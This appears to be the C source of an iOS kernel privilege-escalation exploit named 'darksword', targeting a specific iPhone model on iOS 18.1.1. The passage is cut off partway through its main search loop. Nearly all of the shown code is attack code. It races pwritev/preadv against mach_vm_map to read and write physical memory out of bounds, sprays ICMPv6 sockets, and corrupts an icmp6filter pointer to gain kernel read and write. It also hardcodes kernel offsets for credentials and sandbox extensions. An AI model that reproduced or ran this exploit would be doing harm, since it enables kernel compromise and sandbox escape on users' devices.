// xcrun --sdk iphoneos cc -arch arm64 -miphoneos-version-min=15.0 -g \
//       -Wno-incompatible-pointer-types-discards-qualifiers \
//       -o output/ios-arm64/bin/darksword \
//       examples/darksword.c \
//       -framework CoreFoundation -framework IOSurface

#include <CoreFoundation/CoreFoundation.h>
#include <IOSurface/IOSurfaceRef.h>
#include <sys/mman.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <fcntl.h>
#include <errno.h>
#include <mach/mach.h>
#include <sys/utsname.h>
#include <sys/fileport.h>
#include <sys/socket.h>
#define IPPROTO_ICMPV6          58
#define ICMP6_FILTER            18
#include <pthread.h>
#include <sys/uio.h>
#include <dirent.h>
char *sandbox_extension_issue_file(const char *extension_class, const char *path, uint32_t flags);
int sandbox_extension_consume(const char *token);
void IOSurfacePrefetchPages(IOSurfaceRef surface);

#define FAILURE(c) {fflush(stdout); sleep(2); exit(c);}
#define PRINT_VAR(var) {printf(#var ": %#llx\n", var); fflush(stdout); sleep(2);}

// ===== kernel struct offsets — iPhone13,2 / iOS 18.1.1 / 22B91 =====
// inpcb (bsd/netinet/in_pcb.h)
#define OFFSET_PCB_SOCKET       0x40            // inpcb -> inp_socket
#define OFFSET_PCB_LIST_NEXT    0x20            // inpcb -> inp_list.le_next
#define OFFSET_PCB_LIST_PREV    0x28            // inpcb -> inp_list.le_prev
#define OFFSET_PCB_GENCNT       0x78            // inpcb -> inp_gencnt
#define OFFSET_ICMP6FILT        (0x130 + 0x18)  // inpcb -> inp_depend6.inp6_icmp6filt
// socket (bsd/sys/socketvar.h)
#define OFFSET_SO_PROTO         0x20            // socket -> so_proto
#define OFFSET_SOCKET_SO_COUNT  0x254           // socket -> so_usecount (+ so_retaincnt at +4)
// protosw (bsd/sys/protosw.h)
#define OFFSET_PR_INPUT         0x28            // protosw -> pr_input
// kernel base
#define KERNEL_UNSLID_BASE      0xfffffff007004000
// kernel globals (relative to kernel_base)
#define OFFSET_KERNEL_TASK      0xa2d5f8            // &kernel_task
// task (osfmk/kern/task.h)
#define OFFSET_TASK_NEXT        0x30                // task -> tasks.next
#define OFFSET_TASK_PROC_RO     0x3a0               // task -> proc_ro
// proc_ro / proc (bsd/sys/proc_internal.h)
#define OFFSET_PROC_RO_PROC     0x00                // proc_ro -> pr_proc
#define OFFSET_PROC_RO_UCRED    0x18                // proc_ro -> pr_ucred
#define OFFSET_PROC_PID         0x60                // proc -> p_pid
#define OFFSET_PROC_PCOMM       0x56c               // proc -> p_comm
// socket (cont.)
#define OFFSET_SO_CRED          0x208               // socket -> so_cred
// ucred / sandbox
#define OFFSET_UCRED_LABEL      0x78                // ucred -> cr_label
#define OFFSET_LABEL_SANDBOX    0x10                // cr_label -> slot[1] (sandbox)
#define OFFSET_SANDBOX_EXTSET   0x10                // sandbox -> ext_set
#define OFFSET_EXT_NEXT         0x00                // extension -> next
#define OFFSET_EXT_DATA         0x40                // extension -> data
#define OFFSET_EXT_DATA_LEN     0x48                // extension -> data_length

#define OOB_OFFSET 0x100
#define OOB_SIZE 0xf00
#define OOB_PAGES_NUM 2

static uint64_t __xpaci(uint64_t a)
{
    // Strip PAC: sign-extend from bit 39 (40-bit kernel VA, T1SZ=24, A14)
    if (a & (1ULL << 39))
        return a | 0xFFFFFF0000000000ULL;
    else
        return a & 0x000000FFFFFFFFFFULL;
}

void memset64(void *ptr, uint64_t val, size_t size)
{
	uint8_t *ptr8 = ptr;
	for (uint64_t idx = 0; idx < size; idx += sizeof(uint64_t)) {
		uint64_t *ptr64 = (uint64_t *)&ptr8[idx];
		*ptr64 = val;
	}
}

typedef struct {
	uint64_t *data;
	int count;
	int capacity;
} u64_array_t;

void u64_array_init(u64_array_t *a, int initial_capacity)
{
	a->data = calloc(initial_capacity, sizeof(uint64_t));
	a->count = 0;
	a->capacity = initial_capacity;
}

void u64_array_push(u64_array_t *a, uint64_t val)
{
	if (a->count >= a->capacity) {
		a->capacity *= 2;
		a->data = realloc(a->data, a->capacity * sizeof(uint64_t));
	}
	a->data[a->count++] = val;
}

uint64_t u64_array_last(u64_array_t *a)
{
	return a->count > 0 ? a->data[a->count - 1] : 0;
}

uint64_t u64_array_first(u64_array_t *a)
{
	return a->count > 0 ? a->data[0] : 0;
}

void u64_array_pop(u64_array_t *a)
{
	if (a->count > 0) a->count--;
}

bool u64_array_contains(u64_array_t *a, uint64_t val)
{
	for (int i = 0; i < a->count; i++) {
		if (a->data[i] == val) return true;
	}
	return false;
}

void u64_array_reset(u64_array_t *a)
{
	a->count = 0;
}

void u64_array_free(u64_array_t *a)
{
	free(a->data);
	a->data = NULL;
	a->count = 0;
	a->capacity = 0;
}


int readFd;
int writeFd;
kern_return_t mach_vm_map(vm_map_t target_task, mach_vm_address_t *address, mach_vm_size_t size, mach_vm_offset_t mask, int flags, mem_entry_name_port_t object, memory_object_offset_t offset, boolean_t copy, vm_prot_t cur_protection, vm_prot_t max_protection, vm_inherit_t inheritance);
kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address, mach_vm_size_t size, int flags);
kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address, mach_vm_size_t size);

int highestSuccessIdx = 0;
int successReadCount = 0;
struct iovec iov;
uint64_t randomMarker;
uint64_t wiredPageMarker;
mach_port_t pcObject = MACH_PORT_NULL;
mach_vm_address_t pcAddress = 0;
mach_vm_size_t pcSize;

u64_array_t socketPorts;
u64_array_t socketPcbIds;
uint8_t *socketInfoBuf = NULL;
#define GETSOCKOPT_READ_LEN 32
void *getsockoptReadData = NULL;

volatile uint8_t goSync = 0;
volatile uint8_t raceSync = 0;
volatile uint8_t freeThreadStart = 0;
volatile mach_vm_address_t freeTarget = 0;
volatile mach_vm_size_t freeTargetSize = 0;
volatile mem_entry_name_port_t targetObject = 0;
volatile memory_object_offset_t targetObjectOffset = 0;

int totalAttempts = 0;
int pwritevFails = 0;
int lseekFails = 0;
int readFails = 0;
int markerMatches = 0;

void krw_sockets_leak_forever(void);
int controlSocket = 0;
int rwSocket = 0;
uint64_t controlSocketPcb = 0;
uint64_t rwSocketPcb = 0;
uint64_t originalIcmp6Filter = 0;
#define EARLY_KRW_LENGTH 0x20
uint8_t controlData[EARLY_KRW_LENGTH];


void setTargetKaddr(uint64_t where)
{
	memset(controlData, 0, EARLY_KRW_LENGTH);
	*(uint64_t *)controlData = where;
	int res = setsockopt(controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER, controlData, EARLY_KRW_LENGTH);
	if (res != 0) {
		printf("[-] setTargetKaddr setsockopt failed: errno=%d\n", errno);
		FAILURE(0);
	}
}

#define TARGET_FILE_SIZE (PAGE_SIZE * 0x2)
void *default_file_content;
const char *executableName;

pthread_t freeThread;

void init_globals(void)
{
	u64_array_init(&socketPorts, 32768);
	u64_array_init(&socketPcbIds, 32768);
	getsockoptReadData = calloc(1, GETSOCKOPT_READ_LEN);
	default_file_content = calloc(1, TARGET_FILE_SIZE);
	randomMarker         = (uint64_t)arc4random() << 32 | arc4random();
	wiredPageMarker      = (uint64_t)arc4random() << 32 | arc4random();
}

void create_target_file(const char *path) {
	FILE *f = fopen(path, "w");
	if (!f) {
		printf("[-] fopen failed for %s: errno=%d\n", path, errno);
		FAILURE(0);
	}
	size_t written = fwrite(default_file_content, 1, TARGET_FILE_SIZE, f);
	if (written != TARGET_FILE_SIZE) {
		printf("[-] fwrite failed: wrote=%zu expected=%lu errno=%d\n", written, (unsigned long)TARGET_FILE_SIZE, errno);
		FAILURE(0);
	}
	fclose(f);
}

void init_target_file()
{
	char *read_file_path = calloc(1, 1024);
    char *write_file_path = calloc(1, 1024);
	confstr(_CS_DARWIN_USER_TEMP_DIR, read_file_path, 1024);
    confstr(_CS_DARWIN_USER_TEMP_DIR, write_file_path, 1024);

	char read_file_name[100];
	char write_file_name[100];
	snprintf(read_file_name, 100, "/%u", arc4random());
	snprintf(write_file_name, 100, "/%u", arc4random());

	strcat(read_file_path, read_file_name);
	strcat(write_file_path, write_file_name);

	create_target_file(read_file_path);
    create_target_file(write_file_path);

	readFd  = open(read_file_path, O_RDWR);
	writeFd = open(write_file_path, O_RDWR);

	if (readFd < 0 || writeFd < 0) {
		printf("[-] open failed: readFd=%d writeFd=%d errno=%d\n", readFd, writeFd, errno);
		FAILURE(0);
	}

	printf("[+] readFd: %d\n", readFd);
	printf("[+] writeFd: %d\n", writeFd);

	remove(read_file_path);
	remove(write_file_path);
	fcntl(readFd, F_NOCACHE, 1);
	fcntl(writeFd, F_NOCACHE, 1);
}

void *free_thread_func(void *arg)
{
	while (freeThreadStart == 0);

	while (goSync == 0);

	while (goSync != 0) {
		while (raceSync == 0);

		kern_return_t kr = mach_vm_map(mach_task_self(),
									   &freeTarget,
									   freeTargetSize,
									   0,
									   VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
									   targetObject,
									   targetObjectOffset,
									   0,
									   VM_PROT_DEFAULT,
									   VM_PROT_DEFAULT,
									   VM_INHERIT_NONE);

		if (kr != KERN_SUCCESS) {
			printf("[-] mach_vm_map failed !!! kr=%d\n", kr);
            printf("[+] freeTarget: %#llx\n", freeTarget);
            printf("[+] freeTargetSize: %#llx\n", freeTargetSize);
            printf("[+] targetObject: %#x\n", targetObject);
            printf("[+] targetObjectOffset: %#llx\n", targetObjectOffset);
			FAILURE(0);
		}

		raceSync = 0;
	}

	return NULL;
}

fileport_t spray_socket(u64_array_t *ports)
{
	int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
	if (fd == -1) {
		printf("[-] socket create failed: errno=%d\n", errno);
		return fd;
	}

	fileport_t outputSocketPort = 0;
	int fpr = fileport_makeport(fd, &outputSocketPort);
	close(fd);
	if (fpr != 0) {
		printf("[-] fileport_makeport failed: %d\n", fpr);
		return -1;
	}

	if (!socketInfoBuf) socketInfoBuf = calloc(1, 0x400);
	memset(socketInfoBuf, 0, 0x400);
	pid_t real_pid = (pid_t)syscall(20);
	syscall(336, 6, real_pid, 3, outputSocketPort, socketInfoBuf, 0x400);
	uint64_t inp_gencnt = *(uint64_t *)(socketInfoBuf + 0x110);
	u64_array_push(&socketPcbIds, inp_gencnt);

	u64_array_push(ports, (uint64_t)outputSocketPort);
	return outputSocketPort;
}

void sockets_release(u64_array_t *ports)
{
	while (ports->count > 0) {
		mach_port_deallocate(mach_task_self(), (mach_port_t)u64_array_last(ports));
		u64_array_pop(ports);
	}
}

void surface_mlock(uint64_t address, uint64_t size)
{
	int ret = mlock((void *)address, size);
	if (ret != 0) {
		printf("[-] mlock failed: addr=%#llx size=%#llx errno=%d\n", (unsigned long long)address, (unsigned long long)size, errno);
		FAILURE(0);
	}
}

void surface_munlock(uint64_t address, uint64_t size)
{
	int ret = munlock((void *)address, size);
	if (ret != 0) {
		printf("[-] munlock failed: addr=%#llx size=%#llx errno=%d\n", (unsigned long long)address, (unsigned long long)size, errno);
	}
}


void pe_init(void)
{
	init_target_file();

	if (!executableName) {
		executableName = getprogname();
		printf("[i] executableName: %s\n", executableName);
	}

	int pthr = pthread_create(&freeThread, NULL, free_thread_func, NULL);
	if (pthr != 0) {
		printf("[-] pthread_create failed: %d\n", pthr);
		FAILURE(0);
	}
}

void create_physically_contiguous_mapping(mach_port_t *port, mach_vm_address_t *address, mach_vm_size_t size)
{
	CFStringRef keys[2];
	CFTypeRef vals[2];
	long long size_ll = (long long)size;
	keys[0] = kIOSurfaceAllocSize;
	keys[1] = CFSTR("IOSurfaceMemoryRegion");
	vals[0] = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongLongType, &size_ll);
	vals[1] = CFSTR("PurpleGfxMem");
	CFDictionaryRef params = CFDictionaryCreate(kCFAllocatorDefault,
		(const void **)keys, (const void **)vals, 2,
		&kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
	CFRelease(vals[0]);

	IOSurfaceRef surface = IOSurfaceCreate(params);
	CFRelease(params);

	if (!surface) {
		printf("[-] Failed to create PurpleGfxMem surface: size=%#llx (no IOReturn available)\n", (unsigned long long)size);
		FAILURE(0);
	}

	void *physicalMappingAddress = IOSurfaceGetBaseAddress(surface);
	if (!physicalMappingAddress) {
		printf("[-] IOSurfaceGetBaseAddress returned NULL\n");
		FAILURE(0);
	}
	printf("[+] physicalMappingAddress: %p\n", physicalMappingAddress);

	mach_port_t memoryObject;
	kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &size, (mach_vm_address_t)physicalMappingAddress, VM_PROT_DEFAULT, &memoryObject, 0);
	if (kr != KERN_SUCCESS) {
		printf("[-] mach_make_memory_entry_64 failed: kr=%d\n", kr);
		FAILURE(0);
	}

	mach_vm_address_t newMappingAddress;
	kr = mach_vm_map(mach_task_self(), &newMappingAddress, size, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, memoryObject, 0, 0, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);

	if (kr != KERN_SUCCESS) {
		printf("[-] mach_vm_map (contiguous) failed: kr=%d\n", kr);
		FAILURE(0);
	}

	CFRelease(surface);
	*port = memoryObject;
	*address = newMappingAddress;
}

void initialize_physical_read_write(uint64_t contiguous_mapping_size)
{
	pcSize = contiguous_mapping_size;
	create_physically_contiguous_mapping(&pcObject, &pcAddress, pcSize);
	printf("[+] pcObject: %u\n", pcObject);
	printf("[+] pcAddress: %#llx\n", pcAddress);
	memset64((void *)pcAddress, randomMarker, pcSize);
	freeTarget = pcAddress,
	freeTargetSize = pcSize;
	freeThreadStart = 1;
	goSync = 1;
}

kern_return_t physical_oob_read_mo(mach_port_t memoryObject, mach_vm_offset_t memoryObjectOffset, mach_vm_size_t size, mach_vm_offset_t offset, void *buffer)
{
	if (fcntl(readFd, F_GETFD) < 0) {
		printf("[-] readFd=%d invalid before race: errno=%d\n", readFd, errno);
		FAILURE(0);
	}

	targetObject = memoryObject;
	targetObjectOffset = memoryObjectOffset;
	iov.iov_base = (void *)(pcAddress + 0x3f00);
	iov.iov_len = offset + size;
	*(uint64_t *)buffer = randomMarker;
	*(uint64_t *)(pcAddress + 0x3f00 + offset) = randomMarker;

	bool readRaceSucceeded = false;
	int w = 0;
	for (int tryIdx = 0; tryIdx < highestSuccessIdx + 100; tryIdx++) {
		totalAttempts++;
		*(uint64_t *)(pcAddress + 0x3f00 + offset) = randomMarker;
		raceSync = 1;
		errno = 0;
		w = pwritev(readFd, &iov, 1, 0x3f00);
		int pwritev_errno = errno;
		while (raceSync == 1);
		if (w == -1 && totalAttempts <= 3) {
			printf("[i] pwritev failed: errno=%d w=%d\n", pwritev_errno, w);
		}

		kern_return_t kr = mach_vm_map(mach_task_self(),
									   &pcAddress,
									   pcSize,
									   0,
									   VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
									   pcObject,
									   0,
									   0,
									   VM_PROT_DEFAULT,
									   VM_PROT_DEFAULT,
									   VM_INHERIT_NONE);
		if (kr != KERN_SUCCESS) {
			printf("[-] mach_vm_map (oob_read restore) failed: kr=%d\n", kr);
			FAILURE(0);
		}
		if (w == -1) {
			pwritevFails++;
			off_t seeked = lseek(readFd, 0x3f00 + offset, SEEK_SET);
			if (seeked < 0) {
				lseekFails++;
				printf("[-] lseek failed: errno=%d, recreating fds (attempts=%d pwritevFails=%d lseekFails=%d)\n", errno, totalAttempts, pwritevFails, lseekFails);
				close(readFd);
				close(writeFd);
				init_target_file();
				break;
			}
			ssize_t r = read(readFd, buffer, size);
			if (r < 0) {
				readFails++;
				printf("[-] read failed: errno=%d, recreating fds (attempts=%d pwritevFails=%d readFails=%d)\n", errno, totalAttempts, pwritevFails, readFails);
				close(readFd);
				close(writeFd);
				init_target_file();
				break;
			}
			uint64_t marker = *(uint64_t *)buffer;
			if (totalAttempts <= 3) {
				printf("[i] read back marker=%#llx randomMarker=%#llx\n", (unsigned long long)marker, (unsigned long long)randomMarker);
			}
			if (marker == randomMarker) {
				markerMatches++;
			}
			if (marker != randomMarker) {
				readRaceSucceeded = true;
				successReadCount++;
				if (tryIdx > highestSuccessIdx) {
					highestSuccessIdx = tryIdx;
				}
				break;
			} else {
				usleep(1);
			}
		}
		if (tryIdx == 500) {
			break;
		}
	}
	targetObject = 0;
	if (!readRaceSucceeded) return 1;
	return KERN_SUCCESS;
}

kern_return_t physical_oob_read_mo_with_retry(mach_port_t memoryObject, mach_vm_offset_t memoryObjectOffset, mach_vm_size_t size, mach_vm_offset_t offset, void *buffer)
{
	kern_return_t kr;
	for (int retry = 0; retry < 10000; retry++) {
		kr = physical_oob_read_mo(memoryObject, memoryObjectOffset, size, offset, buffer);
		if (kr == KERN_SUCCESS) return kr;
	}
	printf("[-] physical_oob_read_mo_with_retry: gave up after 10000 tries\n");
	FAILURE(0);
	return kr;
}

void physical_oob_write_mo(mach_port_t memoryObject, mach_vm_offset_t memoryObjectOffset, mach_vm_size_t size, mach_vm_offset_t offset, void *buffer)
{
	targetObject = memoryObject;
	targetObjectOffset = memoryObjectOffset;
	iov.iov_base = (void *)(pcAddress + 0x3f00);
	iov.iov_len = offset + size;

	// zero the file prefix at 0x3f00-0x3fff so old OOB read data doesn't
	// corrupt the end of the first physical page during the preadv race
	uint8_t zero_prefix[0x100] = {0};
	pwrite(writeFd, zero_prefix, sizeof(zero_prefix), 0x3f00);
	ssize_t pw = pwrite(writeFd, buffer, size, 0x3f00 + offset);
	if (pw < 0) {
		printf("[-] pwrite failed: errno=%d\n", errno);
		FAILURE(0);
	}
	for (int tryIdx = 0; tryIdx < 20; tryIdx++) {
		raceSync = 1;
		preadv(writeFd, &iov, 1, 0x3f00);
		while (raceSync == 1);
		kern_return_t kr = mach_vm_map(mach_task_self(),
						 &pcAddress,
						 pcSize,
						 0,
						 VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
						 pcObject,
						 0,
						 0,
						 VM_PROT_DEFAULT,
						 VM_PROT_DEFAULT,
						 VM_INHERIT_NONE);

		if (kr != KERN_SUCCESS) {
			printf("[-] mach_vm_map (oob_write restore) failed: kr=%d\n", kr);
			FAILURE(0);
		}
	}
	targetObject = 0;
}

void set_target_kaddr(uint64_t where)
{
	memset(controlData, 0, EARLY_KRW_LENGTH);
	*(uint64_t *)controlData = where;
	int res = setsockopt(controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER, controlData, EARLY_KRW_LENGTH);
	if (res != 0) {
		printf("[-] set_target_kaddr setsockopt failed: errno=%d where=%#llx\n", errno, (unsigned long long)where);
		FAILURE(0);
	}
}

void early_kread(uint64_t where, void *read_buf, size_t size)
{
	if (size > EARLY_KRW_LENGTH) {
      printf("[!] error: (size > EARLY_KRW_LENGTH)\n");
      FAILURE(0);
    }
    set_target_kaddr(where);
    socklen_t read_data_length = size;
    int res = getsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, read_buf, &read_data_length);
    if (res != 0) {
		printf("[-] early_kread getsockopt failed: errno=%d where=%#llx\n", errno, (unsigned long long)where);
		FAILURE(0);
    }
}

uint64_t early_kread64(uint64_t where)
{
	// zone bounds check: getsockopt validates filter_ptr + 32 fits
	// in the zone element. align down to read safely from small objects.
	uint64_t aligned = where & ~0x1FULL; // align to 32-byte boundary
	uint8_t buf[EARLY_KRW_LENGTH];
	early_kread(aligned, buf, EARLY_KRW_LENGTH);
	return *(uint64_t *)(buf + (where - aligned));
}

void early_kwrite32bytes(uint64_t where, uint8_t writeBuf[EARLY_KRW_LENGTH])
{
	set_target_kaddr(where);
	int res = setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, writeBuf, EARLY_KRW_LENGTH);
	if (res != 0) {
		printf("[-] early_kwrite32bytes setsockopt failed: errno=%d where=%#llx\n", errno, (unsigned long long)where);
		FAILURE(0);
	}
}

void early_kwrite64(uint64_t where, uint64_t what)
{
	// zone-safe: align the read/write to avoid overflowing small zone elements
	uint64_t aligned = where & ~0x1FULL;
	int off = (int)(where - aligned);
	uint8_t writeBuf[EARLY_KRW_LENGTH];
	early_kread(aligned, writeBuf, EARLY_KRW_LENGTH);
	*(uint64_t *)(writeBuf + off) = what;
	early_kwrite32bytes(aligned, writeBuf);
}

int find_and_corrupt_socket(mach_port_t memoryObject, mach_vm_offset_t seekingOffset, void *readBuffer, void *writeBuffer, u64_array_t *targetInpGencntList, bool doRead)
{
	if (doRead) {
		physical_oob_read_mo_with_retry(memoryObject, seekingOffset, OOB_SIZE, OOB_OFFSET, readBuffer);
	}

	int searchStartIdx = 0;
	bool targetFound = false;
	uint64_t pcbStartOffset = 0;
	void *found = NULL;
	do {
		found = memmem(readBuffer + searchStartIdx, OOB_SIZE - searchStartIdx, executableName, strlen(executableName));
		if (found) {
			pcbStartOffset = (uint64_t)found - (uint64_t)readBuffer & 0xFFFFFFFFFFFFFC00;
			uint64_t filt = *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + OFFSET_ICMP6FILT);
			uint64_t filt8 = *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + OFFSET_ICMP6FILT + 8);
			uint64_t listp = *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + OFFSET_PCB_LIST_PREV);
			uint64_t gencnt = *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + OFFSET_PCB_GENCNT);
			// validate: filter and list pointers must be kernel pointers, gencnt must be small
			if (filt8 && (filt >> 56) == 0xff && (listp >> 56) == 0xff && gencnt < 0x100000) {
				targetFound = true;
				break;
			}
		}
		searchStartIdx += 0x400;
	} while (found == NULL && searchStartIdx < OOB_SIZE);

	if (targetFound) {
		printf("[+] pcbStartOffset: %#llx\n", pcbStartOffset);
		uint64_t targetInpGencnt = *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + OFFSET_PCB_GENCNT);
		printf("[+] targetInpGencnt: %#llx\n", targetInpGencnt);

		// match gencnt against spray to find exact socket index
		bool isOurPcb = false;
		int controlSocketIdx = -1;
		for (int si = 0; si < socketPcbIds.count; si++) {
			if (socketPcbIds.data[si] == targetInpGencnt) {
				isOurPcb = true;
				controlSocketIdx = si;
				break;
			}
		}
		if (!isOurPcb) {
			printf("[-] Found freed PCB (gencnt not in spray)\n");
			return -1;
		}
		if (targetInpGencnt == u64_array_last(&socketPcbIds)) {
			printf("[-] Found last PCB\n");
			return -1;
		}
		if (u64_array_contains(targetInpGencntList, targetInpGencnt)) {
			printf("[-] Found old PCB Page!!!!\n");
			return -1;
		}
		u64_array_push(targetInpGencntList, targetInpGencnt);
		uint64_t inpListNextPointer = *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + OFFSET_PCB_LIST_PREV) - OFFSET_PCB_LIST_NEXT;
		uint64_t icmp6Filter = *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + OFFSET_ICMP6FILT);
		printf("[+] inpListNextPointer: %#llx\n", inpListNextPointer);
		printf("[+] icmp6Filter: %#llx\n", icmp6Filter);
		originalIcmp6Filter = icmp6Filter;
		rwSocketPcb = inpListNextPointer;
		memcpy(writeBuffer, readBuffer, OOB_SIZE);
		*(uint64_t *)((uintptr_t)writeBuffer + pcbStartOffset + OFFSET_ICMP6FILT) = inpListNextPointer + OFFSET_ICMP6FILT;

		printf("[+] Corrupting icmp6filter pointer...\n");
		// write only enough to cover target PCB — the OOB read is non-atomic
		// (race captures a mix of randomMarker and real data), so collateral PCBs
		// in the writeBuffer may contain randomMarker at their icmp6filt offset.
		// writing those back corrupts their filter pointers → zone_require panic.
		// write ONLY up to and including the 8-byte filter pointer — minimize footprint
		mach_vm_size_t writeSize = pcbStartOffset + OFFSET_ICMP6FILT + 8;
		if (writeSize > OOB_SIZE) writeSize = OOB_SIZE;
		while (true) {
			physical_oob_write_mo(memoryObject, seekingOffset, writeSize, OOB_OFFSET, writeBuffer);
			physical_oob_read_mo_with_retry(memoryObject, seekingOffset, OOB_SIZE, OOB_OFFSET, readBuffer);
			uint64_t newIcmp6Filter = *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + OFFSET_ICMP6FILT);
			if (newIcmp6Filter == inpListNextPointer + OFFSET_ICMP6FILT) {
				printf("[+] target corrupted: %#llx\n", newIcmp6Filter);
				break;
			}
		}
		controlSocket = fileport_makefd((fileport_t)socketPorts.data[controlSocketIdx]);
		rwSocket = fileport_makefd((fileport_t)socketPorts.data[controlSocketIdx + 1]);
		if (controlSocket < 0 || rwSocket < 0) {
			printf("[-] fileport_makefd failed: control=%d rw=%d\n", controlSocket, rwSocket);
			return -1;
		}
		printf("[+] controlSocket idx=%d fd=%d, rwSocket fd=%d\n", controlSocketIdx, controlSocket, rwSocket);
		fflush(stdout);

		memset(controlData, 0, EARLY_KRW_LENGTH);
		*(uint64_t *)controlData = rwSocketPcb + OFFSET_PCB_LIST_NEXT;
		if (setsockopt(controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER, controlData, EARLY_KRW_LENGTH) != 0) {
			printf("[-] KRW validation: setsockopt failed, retrying\n"); fflush(stdout);
			// don't close — corrupted filter would panic on rip6_detach
			controlSocket = 0; rwSocket = 0;
			return -1;
		}
		uint8_t vbuf[EARLY_KRW_LENGTH];
		socklen_t vlen = EARLY_KRW_LENGTH;
		if (getsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, vbuf, &vlen) != 0) {
			printf("[-] KRW validation: getsockopt failed, retrying\n"); fflush(stdout);
			controlSocket = 0; rwSocket = 0;
			return -1;
		}
		controlSocketPcb = __xpaci(*(uint64_t *)vbuf);
		if ((controlSocketPcb >> 56) != 0xff || controlSocketPcb == (uint64_t)-1) {
			printf("[-] KRW validation: controlSocketPcb=%#llx bad, retrying\n", controlSocketPcb); fflush(stdout);
			controlSocket = 0; rwSocket = 0;
			return -1;
		}
		printf("[i] controlSocketPcb=%#llx (validated)\n", controlSocketPcb); fflush(stdout);
		return KERN_SUCCESS;
	}
	return -1;
}

bool isA18Device = false;

void pe_v1(void)
{
	uint64_t totalSearchMappingPagesNum = isA18Device ? (0x10 * 0x10) : (0x1000 * 0x10);
	uint64_t searchMappingSize = isA18Device ? (0x10 * PAGE_SIZE) : (0x2000 * PAGE_SIZE);
	uint64_t totalSearchMappingSize = totalSearchMappingPagesNum * PAGE_SIZE;
	uint64_t searchMappingNum = totalSearchMappingSize / searchMappingSize;

	printf("[i] totalSearchMappingPagesNum: %#llx\n", totalSearchMappingPagesNum);
	printf("[i] searchMappingSize: %#llx\n", searchMappingSize);
	printf("[i] totalSearchMappingSize: %#llx\n", totalSearchMappingSize);
	printf("[i] searchMappingNum: %#llx\n", searchMappingNum);

	void *readBuffer = calloc(1, OOB_SIZE);
	void *writeBuffer = calloc(1, OOB_SIZE);
	initialize_physical_read_write(OOB_PAGES_NUM * PAGE_SIZE);
	mach_vm_address_t wiredMapping = 0;
	mach_vm_size_t wiredMappingSize = 1024ULL * 1024ULL * 1024ULL * 3ULL;
	kern_return_t kr = KERN_SUCCESS;
	if (isA18Device) {
		kr = mach_vm_allocate(mach_task_self(), &wiredMapping, wiredMappingSize, VM_FLAGS_ANYWHERE);
		if (kr != KERN_SUCCESS) {
			printf("[-] mach_vm_allocate (wired) failed: kr=%d\n", kr);
			FAILURE(0);
		}
		printf("[+] wiredMapping: %#llx\n", wiredMapping);
	}
	u64_array_t targetInpGencntList;
	u64_array_init(&targetInpGencntList, 256);
	for (int outerIter = 0; ; outerIter++) {
		printf("[i] search iteration: %d\n", outerIter);
		if (isA18Device) {
			surface_mlock(wiredMapping, wiredMappingSize);
			for (int s = 0; s < (wiredMappingSize / 0x4000); s++) {
				*(uint64_t *)(wiredMapping + s + 0x4000) = 0;
			}
		}
		u64_array_t searchMappings;
		u64_array_init(&searchMappings, searchMappingNum);
		for (uint64_t s = 0; s < searchMappingNum; s++) {
			mach_vm_address_t searchMappingAddress = 0;
			kr = mach_vm_allocate(mach_task_self(), &searchMappingAddress, searchMappingSize, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
			if (kr != KERN_SUCCESS) {
				printf("[-] mach_vm_allocate (search) failed: kr=%d size=%#llx\n", kr, (unsigned long long)searchMappingSize);
				FAILURE(0);
			}
			for (int k = 0; k < searchMappingSize; k += PAGE_SIZE) {
				*(uint64_t *)(searchMappingAddress + k) = randomMarker;
			}
			u64_array_push(&searchMappings, searchMappingAddress);
		}
		u64_array_reset(&socketPorts);
		u64_array_reset(&socketPcbIds);
		unsigned socketPortsCount = 0;
		#define OPEN_MAX 10240
		int maxfiles = OPEN_MAX;
		int leeway = 2048;
		for (unsigned socketCount = 0; socketCount < (maxfiles - leeway); socketCount++) {
			mach_port_t port = spray_socket(&socketPorts);
			if (port == -1) {
				printf("[-] Failed to spray sockets: %u\n", socketCount);
				break;
			} else {
				socketPortsCount++;
			}
		}
		printf("[i] socketPortsCount: %u\n", socketPortsCount);
		bool success = false;
		for (uint64_t s = 0; s < searchMappingNum; s++) {
			mach_vm_address_t searchMappingAddress = searchMappings.data[s];
			extern int totalAttempts, pwritevFails, lseekFails, readFails, markerMatches;
			printf("[i] looking in search mapping: %llu (race: attempts=%d wins=%d lseekFail=%d readFail=%d markerMatch=%d)\n", s, totalAttempts, pwritevFails, lseekFails, readFails, markerMatches);
			mach_port_t memoryObject = 0;
			mach_vm_size_t memoryObjectSize = searchMappingSize;
			kr = mach_make_memory_entry_64(mach_task_self(), &memoryObjectSize, searchMappingAddress, VM_PROT_DEFAULT, &memoryObject, 0);
			if (kr != KERN_SUCCESS) {
				printf("[-] mach_make_memory_entry_64 (search) failed: kr=%d addr=%#llx\n", kr, (unsigned long long)searchMappingAddress);
				FAILURE(0);
			}
			surface_mlock(searchMappingAddress, searchMappingSize);
			mach_vm_offset_t seekingOffset = 0;
			while (seekingOffset + pcSize <= searchMappingSize) {
